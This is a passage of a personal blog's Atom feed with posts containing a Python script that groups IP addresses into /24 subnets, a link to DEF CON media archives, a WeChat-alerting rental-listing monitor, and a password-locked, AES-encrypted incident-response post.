&lt;figure class=&quot;highlight python&quot;&gt;&lt;figcaption&gt;&lt;span&gt;[] [centos_shell]&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#exp:192.168.1.1  &amp;gt;&amp;gt;&amp;gt;  192.168.1.0/24&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# def cleanCLRFspace(content):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 	noCLContext = content.replace(&#39;\n&#39;,&#39;&#39;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 	noSpaceCLRFcontext = noCLContext.strip()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 	return noSpaceCLRFcontext&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;readFile&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ipf = open(&lt;span class=&quot;string&quot;&gt;&#39;./content.txt&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;r&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ipf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getLineIP&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ipf)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ipList = set()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	texts = ipf.readlines()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; text &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; texts:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		ips = re.findall(&lt;span class=&quot;string&quot;&gt;r&#39;\d+\.\d+?\.\d+?\.\d+?&#39;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ip &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; ips:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			ipList.add(ip)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ipList&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ip2c&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ipNoDup)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ipset = set()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ip &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; ipNoDup:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		ipset.add(re.findall(&lt;span class=&quot;string&quot;&gt;r&#39;\d+?\.\d+?\.\d+?\.&#39;&lt;/span&gt;,ip)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] + &lt;span class=&quot;string&quot;&gt;&#39;0/24&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	iplist = list(ipset)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	iplist.sort()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; iplist&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;saveContext&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(s)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	wfile = open(&lt;span class=&quot;string&quot;&gt;&#39;./result.txt&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; s:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		wfile.write(i+&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	wfile.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&#39;__main__&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ipf = readFile()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ipList = getLineIP(ipf)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	iplist = ip2c(ipList)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	saveContext(iplist)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="sh" scheme="https://10o0.github.io/tags/sh/"/>
    
  </entry>
  
  <entry>
    <title>recording</title>
    <link href="https://10o0.github.io/2018/08/17/recording/"/>
    <id>https://10o0.github.io/2018/08/17/recording/</id>
    <published>2018-08-17T01:43:14.000Z</published>
    <updated>2018-08-17T01:45:41.120Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://media.defcon.org/" target="_blank" rel="noopener">https://media.defcon.org/</a></p><p>last:<a href="https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://media.defcon.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://media.defcon.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;last:&lt;a href=&quot;https://media.defco
      
    
    </summary>
    
      <category term="recording" scheme="https://10o0.github.io/categories/recording/"/>
    
    
      <category term="defcon" scheme="https://10o0.github.io/tags/defcon/"/>
    
  </entry>
  
  <entry>
    <title>Ziroom--Monitor</title>
    <link href="https://10o0.github.io/2018/08/13/ziroom/"/>
    <id>https://10o0.github.io/2018/08/13/ziroom/</id>
    <published>2018-08-13T05:53:40.000Z</published>
    <updated>2018-08-13T06:45:48.735Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sat Apr 28 15:52:59 2018</span></span><br><span class="line"><span class="string">@author: root</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment">#itchat.auto_login()</span></span><br><span class="line">itchat.auto_login(hotReload=<span class="keyword">True</span>)</span><br><span class="line">itchat.auto_login(enableCmdQR=<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#from urllib import request</span></span><br><span class="line">url = <span class="string">"http://phoenix.ziroom.com/v7/room/detail.json?house_id=62947781&amp;city_code=110000&amp;id=61544148"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'accept'</span>: <span class="string">'application/json;version=3'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'phoenix.ziroom.com'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'https://hd.ziroom.com/2018/haiyan/index.html?citycode=110000'</span>,</span><br><span class="line"><span class="comment">#    'token': 'd76a826e-bfb4-4421-902e-132418ebedfa',</span></span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'okhttp/3.10.0'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">    <span class="keyword">except</span> requests.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'Error'</span>, e.args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        json_dict = get_page(url)</span><br><span class="line"><span class="comment">#        print(json_dict)</span></span><br><span class="line">        statuss = json_dict[<span class="string">'data'</span>][<span class="string">'status'</span>]</span><br><span class="line">        nowTime=datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">        print(<span class="string">"status:"</span>,statuss)</span><br><span class="line">        <span class="keyword">if</span> statuss == <span class="string">'zxpzz'</span>:</span><br><span class="line">            print(<span class="string">"NOt Time!!!"</span>)</span><br><span class="line">            itchat.send(<span class="string">'&lt;'</span>+str(n)+<span class="string">'&gt;'</span>+<span class="string">'骚年~装修配置中&gt;&gt;&gt;'</span>+nowTime, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">            time.sleep(<span class="number">360</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"GOGOGOOGOOO!!!!!"</span>)</span><br><span class="line">            itchat.send(<span class="string">'&lt;'</span>+str(n)+<span class="string">'&gt;'</span>+<span class="string">'0o0o0o0~可以预定了--gogogogo&gt;&gt;&gt;'</span>+nowTime, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">            time.sleep(<span class="number">120</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;figcaption&gt;&lt;span&gt;[] [centos_shell]&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line
      
    
    </summary>
    
      <category term="python" scheme="https://10o0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="ziroom" scheme="https://10o0.github.io/tags/ziroom/"/>
    
  </entry>
  
  <entry>
    <title>【应急响应】自动化脚本</title>
    <link href="https://10o0.github.io/2018/06/27/%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>https://10o0.github.io/2018/06/27/【应急响应】自动化脚本/</id>
    <published>2018-06-27T08:05:15.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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